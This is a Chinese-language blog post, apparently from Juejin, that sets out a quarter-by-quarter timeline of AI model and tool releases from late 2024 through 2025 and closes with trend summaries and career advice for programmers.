New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">🗓️ 2024年第四季度（序章）</h2>
<h3 data-id="heading-1">12月26日 - DeepSeek V3 发布</h3>
<p><strong>发布方</strong>: 深度求索（DeepSeek）</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>训练成本仅550万美元</strong>，性能与GPT-4o、Claude-3.5-Sonnet相当</li>
<li>完全开源</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>标志着国产大模型在代码生成能力上的重大突破</li>
<li>极低成本证明了"高性价比AI"的可能性</li>
<li>国产模型首次在算法类代码场景比肩国际顶尖模型</li>
<li>开源优势，为2025年的"DeepSeek震撼"埋下伏笔</li>
</ul>
<hr/>
<h2 data-id="heading-2">🗓️ 2025年第一季度（DeepSeek震撼全球）</h2>
<h3 data-id="heading-3">1月20日 - DeepSeek R1 发布（改变游戏规则）</h3>
<p><strong>发布方</strong>: 深度求索（DeepSeek）</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>专注复杂推理任务的大模型，完全开源</li>
<li><strong>展示了推理模型的真正威力：通过更长时间的思考推理取得更好效果</strong></li>
<li>性能对标GPT-4o和Claude-3.5-Sonnet</li>
<li>在数学推理、代码推理等领域表现优异</li>
<li>API定价仅为OpenAI o1的 2%</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>
<p><strong>华尔街震撼</strong>：</p>
<ul>
<li>英伟达市值一周内蒸发5520-5900亿美元，股价暴跌17%</li>
<li>华尔街科技股总市值缩水约1万亿美元</li>
<li>打破了"高算力=高性能"的传统认知，重塑AI投资逻辑</li>
<li>DeepSeek应用迅速登顶苹果中美区应用商店第一，超越ChatGPT</li>
</ul>
</li>
<li>
<p><strong>AI行业深远影响</strong>：</p>
<ul>
<li>证明了低成本也能实现顶尖AI性能，打破算力垄断</li>
<li>开源策略引发全球开发者热潮</li>
<li>推动推理模型成为AI发展新方向</li>
<li>中国AI技术崛起的标志性事件</li>
<li>开源赋能国产AI生态繁荣</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">2月25日 - Claude 3.7 Sonnet 发布</h3>
<p><strong>发布方</strong>: Anthropic</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>编码测试中超越o3-mini和DeepSeek R1</li>
<li>数学、编码能力较Claude 3.5提升10%+</li>
<li>刷新多项基准测试SOTA</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>编码能力大幅提升，特别是在复杂代码重构场景</li>
<li>成为当时最强的编程助手模型之一</li>
<li>在指令执行和编程任务理解上更加精准</li>
</ul>
<hr/>
<h3 data-id="heading-5">3月6日 - Manus 发布（通用 AI Agent 探索）</h3>
<p><strong>发布方</strong>: 蝴蝶效应公司（Butterfly Effect）</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>全球首批通用AI Agent</li>
<li>能够独立完成报告撰写、数据分析、跨平台操作等复杂任务</li>
<li>能够动态规划和决策</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>标志着AI从"工具"向"智能体"的转变</li>
<li>引发全球AI Agent创业热潮</li>
<li>展示了AI Agent在实际应用中的可能性</li>
<li>为开发者提供了自主智能体开发的新思路</li>
<li>12月30日被 Meta 收购，收购价约25亿美元，距离Manus发布仅9个月</li>
</ul>
<h3 data-id="heading-6">其他并购动态</h3>
<ul>
<li>多家AI初创公司被科技巨头收购</li>
<li>AI应用领域进入整合期</li>
<li>企业级AI成为收购热点</li>
<li>技术团队和IP成为核心资产</li>
</ul>
<hr/>
<h3 data-id="heading-7">3月24日 - DeepSeek V3-0324 版本更新</h3>
<p><strong>发布方</strong>: 深度求索（DeepSeek）</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>代码和数学推理能力显著提升</li>
<li>模型稳定性优化</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>更强的代码生成和调试能力</li>
<li>数学推理能力提升，适合科学计算编程</li>
</ul>
<hr/>
<h3 data-id="heading-8">3月25日 - Gemini 2.5 Pro 发布</h3>
<p><strong>发布方</strong>: Google</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>支持高达100万个token的上下文窗口</strong></li>
<li>在多项基准测试中表现卓越，包括数学、创意写作和科学领域</li>
<li>免费向所有用户开放</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>免费开放降低了高性能AI模型的使用门槛</li>
</ul>
<hr/>
<h3 data-id="heading-9">3月26日 - MCP 0326 版发布与架构升级（生态系统统一）</h3>
<p><strong>发布方</strong>: Anthropic</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>Model Context Protocol（模型上下文协议）0326 版发布</li>
<li>架构升级，提供更强大的能力</li>
<li>标准化AI Agent与外部工具的通信方式</li>
<li>提供统一的上下文管理和工具调用接口</li>
<li>赋能Agent迈向泛智能</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>各大应用纷纷宣布支持MCP</strong></li>
<li>统一AI工具与外部系统的集成标准</li>
<li>让AI助手能够更好地调用API、访问数据库、操作文件系统</li>
<li>为构建复杂AI工作流提供基础设施</li>
<li>改变AI应用开发范式，从单一模型到多工具协作</li>
<li>开发者可以开发MCP服务器，扩展AI能力边界</li>
</ul>
<hr/>
<h2 data-id="heading-10">🗓️ 2025年第二季度（生态建设与标准化）</h2>
<h3 data-id="heading-11">4月初 - Dify 完善开源版本</h3>
<p><strong>发布方</strong>: Dify团队</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>基础版完全开源</strong>，支持本地部署</li>
<li>提供企业级AI应用开发平台</li>
<li>支持工作流编排、Agent构建、知识库管理</li>
<li>支持MCP协议，可接入各种工具</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>提供可视化工作流，降低AI应用开发门槛</li>
<li>支持MCP协议，增强工具集成能力</li>
<li>本地部署保障数据安全</li>
<li><strong>各大企业纷纷本地部署Dify</strong></li>
</ul>
<hr/>
<h3 data-id="heading-12">5月9日 - Cursor 0.50 重大版本更新</h3>
<p><strong>发布方</strong>: Cursor团队</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>全面升级Max模式</li>
<li>新增跨文件代码建议</li>
<li>后台代理功能</li>
<li><strong>可将整个代码库纳入上下文</strong></li>
</ul>
<hr/>
<h3 data-id="heading-13">5月22日 - Claude Code 1.0.0 正式发布（最强编程助手）</h3>
<p><strong>发布方</strong>: Anthropic</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>标志着AI编程进入工业级应用阶段</li>
<li>直接在终端与AI交互</li>
<li>灵活性极高，可集成到任何开发工作流</li>
<li>脚本友好，可自动化各种开发任务</li>
</ul>
<p><strong>对程序员的深远影响</strong>:</p>
<ul>
<li>
<p><strong>至今最强编程助手</strong>：在所有主流编程基准测试中持续领先</p>
</li>
<li>
<p><strong>改变开发范式</strong>：从"辅助编码"到"AI主导开发+人类审查"</p>
</li>
<li>
<p><strong>CLI模式引领行业潮流</strong>：</p>
<ul>
<li>Claude Code的CLI设计成为业界标杆</li>
<li>开启了"AI编程助手CLI化"的行业趋势，后续Google推出<strong>Gemini CLI</strong>，Cursor推出<strong>Cursor CLI</strong></li>
<li>让AI编程助手可以无缝集成到Shell脚本和自动化工作流中</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-14">5月28日 - DeepSeek R1-0528 版本升级</h3>
<p><strong>发布方</strong>: 深度求索（DeepSeek）</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>R1模型小版本升级</li>
<li>复杂推理任务性能显著提升</li>
</ul>
<hr/>
<h3 data-id="heading-15">6月5日 - Cursor 1.0 正式发布</h3>
<p><strong>发布方</strong>: Cursor团队</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>BugBot自动代码审查</li>
<li>Memories记忆功能</li>
<li>Background Agent后台代理全面开放</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>里程碑式进化</strong>：从"辅助编程"进化到"智能编程平台"</li>
<li>引入自动代码审查，AI从被动响应到主动发现问题</li>
<li>记忆功能让AI理解项目历史和开发者习惯，记住代码决策和项目上下文</li>
<li>后台代理实现真正的异步智能协作，无需等待，AI在后台持续工作</li>
</ul>
<hr/>
<h2 data-id="heading-16">🗓️ 2025年第三季度（多模态爆发）</h2>
<h3 data-id="heading-17">7月4日 - Cursor 1.2 版本发布（引入Plan模式）</h3>
<p><strong>发布方</strong>: Cursor团队</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>
<p><strong>Plan模式（任务规划模式）首次发布</strong>：</p>
<ul>
<li><strong>结构化待办列表（To-do lists）</strong> ：将长任务拆分成带依赖关系的步骤</li>
<li><strong>消息队列管理</strong>：有序处理复杂任务</li>
<li><strong>依赖关系可视化</strong>：清晰展示任务间的关联</li>
<li><strong>长周期任务友好</strong>：更容易理解与跟踪大型重构项目</li>
<li><strong>与Agent模式深度整合</strong>：Agent自动创建和维护计划</li>
</ul>
</li>
<li>
<p><strong>Agent任务规划增强</strong>：Agent能够更好地规划和执行长时程任务</p>
</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>Plan模式提供结构化的任务管理，适合大型项目</li>
</ul>
<hr/>
<h3 data-id="heading-18">8月7日 - GPT-5 发布</h3>
<p><strong>发布方</strong>: OpenAI</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>结合推理能力和非推理功能</li>
<li>多模态处理能力显著提升</li>
<li>长文本理解能力增强</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>统一推理和生成能力，一个模型搞定多种任务</li>
<li>多模态能力让代码+图表+UI同时处理成为可能</li>
<li>更长的上下文窗口，适合分析大型项目</li>
</ul>
<hr/>
<h3 data-id="heading-19">8月中旬 - Suno v4 音乐生成模型发布</h3>
<p><strong>发布方</strong>: Suno</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>文本到音乐生成</li>
<li>支持多种音乐风格</li>
<li>可生成带歌词的完整歌曲</li>
<li>音质和自然度显著提升</li>
</ul>
<hr/>
<h3 data-id="heading-20">8月30日 - Nano Banana 发布</h3>
<p><strong>发布方</strong>: Google</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>图像生成模型</li>
<li>当时的最强图片生成模型</li>
<li>集成Gemini能力</li>
</ul>
<hr/>
<h3 data-id="heading-21">9月30日 - Claude 4.5 Sonnet 发布</h3>
<p><strong>发布方</strong>: Anthropic</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>被誉为"世界上最好的编码模型"</strong></li>
<li><strong>能够自主运行长达30小时</strong>：支持大型项目的持续开发</li>
<li><strong>推理和数学能力显著提升</strong>：复杂逻辑处理能力达到新高度</li>
<li><strong>适合构建复杂代理</strong>：多步骤任务规划和执行能力行业领先</li>
<li><strong>Claude Code基于此版本达到巅峰性能</strong></li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>编程性能里程碑</strong>，各项编程排名第一</li>
<li><strong>开发者首选</strong>：专业程序员最信赖的AI编程伙伴</li>
</ul>
<hr/>
<h2 data-id="heading-22">🗓️ 2025年第四季度（AI军备竞赛白热化）</h2>
<h3 data-id="heading-23">10月16日 - Claude Agent Skills 正式发布</h3>
<p><strong>发布方</strong>: Anthropic</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>允许将专业知识、脚本和资源打包成模块化的"技能文件夹"</li>
<li>使AI在特定工作场景中更专业地执行任务</li>
<li>支持企业定制专属技能库</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>更方便地扩展Claude的功能</li>
<li>可创建针对特定编程语言、框架的专业技能</li>
<li>企业可打造符合内部规范的编码技能</li>
<li>提升AI在专业领域的准确性和可靠性</li>
<li>开发者社区涌现大量开源技能</li>
</ul>
<hr/>
<h3 data-id="heading-24">10月16日 - Google Veo 3.1 发布（AI视频生成新里程碑）</h3>
<p><strong>发布方</strong>: Google DeepMind</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>原生音频集成</strong>：首次实现环境音、对话、音效与画面同步生成</li>
<li><strong>1080p高清视频</strong>：支持生成最长60秒的高清视频</li>
<li><strong>生成速度提升</strong>：1-4分钟即可完成，快于前代版本</li>
<li><strong>叙事控制增强</strong>：更好的场景连贯性和故事讲述能力</li>
<li><strong>真实感提升</strong>：画面质量和细节处理达到新高度</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>视频生成技术突破</strong>：音视频同步生成减少后期制作工作量</li>
<li><strong>内容创作民主化</strong>：自5月Flow平台上线，用户已创作超2.75亿个视频</li>
<li><strong>加剧AI视频竞争</strong>：与Sora、Runway等形成激烈竞争，推动行业快速创新</li>
<li><strong>影视制作变革</strong>：为专业影视制作提供高效的AI辅助工具</li>
</ul>
<hr/>
<h3 data-id="heading-25">10月29日 - Cursor 2.0 版本发布</h3>
<p><strong>发布方</strong>: Cursor团队</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>自研编程模型 Composer</li>
<li>浏览器集成功能</li>
<li>支持多模型并行处理，选取最佳效果</li>
</ul>
<hr/>
<h3 data-id="heading-26">11月12日 - GPT-5.1 发布</h3>
<p><strong>发布方</strong>: OpenAI</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>扩展多模态功能</li>
<li>提供8种可定制个性选项（OpenAI迄今最可定制的模型）</li>
<li>在指令遵循和响应风格上实现突破</li>
<li>数学推理和代码生成能力出色</li>
<li>推理速度和用户体验提升</li>
</ul>
<hr/>
<h3 data-id="heading-27">11月19日 - Gemini 3 Pro 发布（谷歌的王牌）</h3>
<p><strong>发布方</strong>: Google</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>在核心基准测试中表现优于GPT-5.1和Claude Sonnet 4.5</strong></li>
<li>推理、多模态、代理工具使用、多语言性能、长上下文等全面领先</li>
<li>支持超长上下文窗口</li>
<li>引发OpenAI的"红色警戒"</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>多语言编程能力强大</li>
<li>多模态能力，可同时处理代码、图表、UI设计</li>
<li>引发新一轮AI军备竞赛</li>
</ul>
<hr/>
<h3 data-id="heading-28">11月20日 - Nano Banana Pro 发布</h3>
<p><strong>发布方</strong>: Google</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>基于Gemini 3 Pro的图像生成模型</li>
<li>图像生成领域表现出色</li>
<li>一体化内容生产力工具</li>
<li>从文本到图像的无缝衔接</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>从文本描述直接生成高质量界面原型</li>
<li>加速前端开发流程</li>
<li>与Gemini 3 Pro形成完整的多模态生态</li>
</ul>
<hr/>
<h3 data-id="heading-29">11月21日 - NotebookLM 重大更新</h3>
<p><strong>发布方</strong>: Google</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>集成 Gemini 3 Pro 和 Nano Banana Pro</li>
<li><strong>一键生成专业PPT功能</strong>：引入Slide Decks功能，支持一键生成专业级别的演示文稿</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>大幅提升演示文稿制作效率</strong>：减少手动编辑时间，节省时间和精力</li>
<li><strong>降低专业PPT制作门槛</strong>：使更多用户能够轻松创建高质量的演示文稿</li>
<li>结合Gemini 3 Pro的强大理解能力，提升内容质量</li>
</ul>
<hr/>
<h3 data-id="heading-30">11月25日 - Claude Opus 4.5 发布</h3>
<p><strong>发布方</strong>: Anthropic</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>世界上最好的编码模型</strong></li>
<li><strong>支持超长上下文</strong>：适合大型代码库分析</li>
<li><strong>Opus级别的深度推理能力</strong>：在复杂架构设计上超越Sonnet</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>继续巩固Claude Code"最强编程助手"地位</strong></li>
<li><strong>适合复杂系统的架构设计和优化</strong>：不仅能写代码，更能做技术决策</li>
<li><strong>深度推理能力</strong>：在系统设计、性能优化等需要深度思考的场景中表现卓越</li>
</ul>
<hr/>
<h3 data-id="heading-31">12月1日 - DeepSeek V3.2 发布</h3>
<p><strong>发布方</strong>: 深度求索（DeepSeek）</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>性能稳定性提升</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>持续迭代展现技术实力</li>
</ul>
<hr/>
<h3 data-id="heading-32">12月1日 - 豆包手机发布</h3>
<p><strong>发布方</strong>: 字节跳动 × 中兴通讯</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>集成豆包AI助手</li>
<li>智能推荐、语音助手、图像识别</li>
<li>AI功能深度集成到系统层</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>移动端AI助手的大胆尝试，首个AI深度集成到移动OS的探索案例</li>
<li>发布后立即被微信、支付宝等主流应用禁用，用户体验严重受限</li>
<li>引发关于AI手机生态的广泛讨论，揭示了平台垄断与AI创新的根本冲突</li>
<li>智谱AI随后开源了AutoGLM项目</li>
</ul>
<hr/>
<h3 data-id="heading-33">12月9日 - GPT-5.2 发布（奥特曼的"红色警戒"）</h3>
<p><strong>发布方</strong>: OpenAI</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>整合GPT系列和o系列能力</li>
<li>具备调度子模型能力</li>
<li><strong>提前发布以应对Gemini 3 Pro的竞争压力</strong></li>
<li>编程能力、创意写作、健康领域显著提升</li>
<li>逻辑推理和长上下文记忆能力提升</li>
<li>推理速度、多模态效率和上下文长度全面提升</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>Sam Altman的"红色警戒"：Gemini 3 Pro的强劲表现让OpenAI感受到压力</li>
<li>统一大语言模型和推理模型，一站式解决方案</li>
<li>编程能力全面提升，对抗Gemini 3 Pro</li>
<li>调用成本较高</li>
</ul>
<hr/>
<h3 data-id="heading-34">12月18日 - Agent Skills 开放标准发布</h3>
<p><strong>发布方</strong>: Anthropic</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>将Agent Skills发布为开放标准</li>
<li>旨在构建AI开放生态</li>
<li>多家头部工具宣布支持</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>推动AI技能生态的开放和标准化</li>
<li>一次开发，多平台使用</li>
</ul>
<hr/>
<h3 data-id="heading-35">12月20日 - Kiro 发布</h3>
<p><strong>发布方</strong>: 亚马逊云科技（AWS）</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li>AI编程工具</li>
<li>支持 <strong>Spec Coding</strong>：规范化编码，强调质量和标准</li>
<li>可连续自主编程数日</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li>Vibe Coding适合快速验证想法</li>
<li>Spec Coding适合生产环境的严谨开发</li>
<li>展示了AI自主编程的潜力</li>
</ul>
<hr/>
<h3 data-id="heading-36">12月23日 - GLM-4.7 发布（国产开源期间新高度）</h3>
<p><strong>发布方</strong>: 智谱AI</p>
<p><strong>核心亮点</strong>:</p>
<ul>
<li><strong>新一代旗舰开源编码大模型</strong>，<strong>位列开源模型与国产模型双榜首</strong></li>
<li>工具调用和复杂推理能力增强</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>国产开源编码模型达到新高度</strong>，标志性突破</li>
<li>长上下文支持，适合大型项目和复杂代码库</li>
<li>极低成本，为企业AI编码提供高性价比选择</li>
</ul>
<hr/>
<h3 data-id="heading-37">12月27日 - Andrej Karpathy坦言"我从未如此落后"</h3>
<p><strong>发布方</strong>: Andrej Karpathy（前OpenAI创始成员、特斯拉AI总监）</p>
<p><strong>核心言论</strong>:</p>
<ul>
<li><strong>"作为程序员，我从未感到如此落后"</strong></li>
<li>编程职业正在被彻底重构：程序员贡献的代码越来越少，更多的是在各种工具之间进行串联</li>
<li><strong>能力差距巨大</strong>：如果能正确利用过去一年出现的新工具，个人能力本可以提升10倍</li>
<li>否则将面临技能焦虑和被淘汰的风险</li>
</ul>
<p><strong>背景介绍</strong>:</p>
<ul>
<li><strong>Vibe Coding 概念提出者</strong>：2025年2月提出通过自然语言提示引导AI生成代码的理念</li>
<li><strong>前OpenAI创始成员</strong>：深度参与GPT系列模型开发</li>
<li><strong>特斯拉AI总监</strong>：负责Autopilot视觉系统</li>
<li><strong>AI教育领域权威</strong>：斯坦福大学CS231n课程创始人，YouTube AI课程观看量超百万</li>
</ul>
<p><strong>行业影响</strong>:</p>
<ul>
<li><strong>引发全球程序员共鸣</strong>：即使是AI领域顶尖专家也感到技术更新压力</li>
<li><strong>验证AI工具迭代速度</strong>：2025年AI工具更新速度超出所有人预期</li>
<li><strong>技能焦虑普遍化</strong>：从初级开发者到行业权威，所有人都面临适应挑战</li>
<li><strong>成为2025年AI讨论的标志性时刻</strong>：真实反映了AI对编程行业的深刻冲击</li>
</ul>
<hr/>
<h2 data-id="heading-38">🌟 2025年AI发展趋势总结</h2>
<h3 data-id="heading-39">1. <strong>推理模型革命</strong></h3>
<ul>
<li>DeepSeek R1开启"推理模型元年"</li>
<li>"慢思考"策略被证明有效：给AI更多时间推理能获得更好结果</li>
<li>推理能力成为AI模型的核心竞争力</li>
<li>o1、R1等推理模型改变AI应用范式</li>
</ul>
<h3 data-id="heading-40">2. <strong>AI Agent时代到来</strong></h3>
<ul>
<li>Manus展示了通用AI Agent的可能性</li>
<li>Dify 降低AI应用开发门槛</li>
<li>MCP协议统一Agent与工具通信</li>
<li>Agent Skills开放标准推动生态繁荣</li>
</ul>
<h3 data-id="heading-41">3. <strong>AI编程工具从"辅助"到"协作"</strong></h3>
<ul>
<li>从简单的代码补全进化到复杂任务的自主完成</li>
<li>Cursor、Claude Code、Kiro等工具引领"AI结对编程"新范式</li>
<li>AI能够连续工作处理大型重构任务</li>
<li>Vibe Coding vs Spec Coding：不同场景选择不同策略</li>
</ul>
<h3 data-id="heading-42">5. <strong>国产大模型崛起与"DeepSeek震撼"</strong></h3>
<ul>
<li>DeepSeek系列在代码能力上全面追平国际顶尖模型、</li>
<li><strong>DeepSeek R1以低成本高性能重塑AI行业认知</strong></li>
<li>中国程序员拥有更多本土化选择</li>
<li>打破"高算力垄断"，证明技术创新的力量</li>
</ul>
<h3 data-id="heading-43">6. <strong>AI巨头军备竞赛白热化</strong></h3>
<ul>
<li>OpenAI vs Google：GPT-5.2提前发布应对Gemini 3 Pro</li>
<li>Anthropic、DeepSeek等多方势力崛起</li>
<li>每月都有重磅模型发布，技术迭代加速</li>
<li>编码能力成为各家PK的主战场</li>
</ul>
<h3 data-id="heading-44">9. <strong>AI生态冲突与重构</strong></h3>
<ul>
<li>豆包手机被微信、支付宝禁用事件</li>
<li>AI硬件与传统软件生态的矛盾</li>
<li>平台垄断与AI创新的冲突凸显</li>
</ul>
<hr/>
<h2 data-id="heading-45">💡 对程序员的建议</h2>
<ol start="0">
<li><strong>掌握推理模型的使用</strong>：了解模型使用的边界，比如理解何时需要推理，何时需要快速响应</li>
<li><strong>学习AI Agent开发</strong>：MCP、Agent Skills等成为重要技能</li>
<li><strong>提升提示词工程能力</strong>：如何精准描述需求成为核心技能</li>
<li><strong>关注企业级应用</strong>：本地部署、技能定制等企业需求</li>
<li><strong>保持架构思维</strong>：有识别架构设计方案优劣的能力</li>
<li><strong>培养代码review能力</strong>：验证AI生成代码的正确性、安全性和性能</li>
<li><strong>学习多工具组合</strong>：不同任务选择最适合的AI工具</li>
<li><strong>关注成本优化</strong>：开源模型提供高性价比选择</li>
<li><strong>持续学习</strong>：AI发展日新月异，每月都有重磅更新</li>
<li><strong>探索多模态应用</strong>：视频、音乐、图像生成为应用开发带来新可能</li>
</ol>
<hr/>
<h2 data-id="heading-46">💬 结语</h2>
<p>2025年，AI不仅改变了我们写代码的方式，更重塑了整个行业的格局和商业模式。从"快速生成"到"深度推理"，从"单一模型"到"Agent协作"，从"高昂成本"到"平民价格"，AI技术的发展和商业化都超出了所有人的预期。</p>
<p>作为程序员，我们既是见证者，也是参与者。<strong>未来属于那些能够驾驭AI的人。</strong></p>
<p>在这个AI编程工具百花齐放的时代，选择适合自己的工具、理解推理模型的价值、掌握Agent开发技能、参与开放标准，这些将成为程序员的核心竞争力。</p>
<p>2025年已经如此精彩，2026年又会给我们带来什么惊喜？让我们拭目以待！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 年终回顾：25 岁，从“混吃等死”到别人眼中的“技术专家”]]></title>    <link>https://juejin.cn/post/7592789801708896297</link>    <guid>https://juejin.cn/post/7592789801708896297</guid>    <pubDate>2026-01-08T09:33:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708896297" data-draft-id="7592555965793222662" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 年终回顾：25 岁，从“混吃等死”到别人眼中的“技术专家”"/> <meta itemprop="keywords" content="前端,年终总结,程序员"/> <meta itemprop="datePublished" content="2026-01-08T09:33:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="何贤"/> <meta itemprop="url" content="https://juejin.cn/user/277499952247869"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 年终回顾：25 岁，从“混吃等死”到别人眼中的“技术专家”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/277499952247869/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    何贤
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:33:53.000Z" title="Thu Jan 08 2026 09:33:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
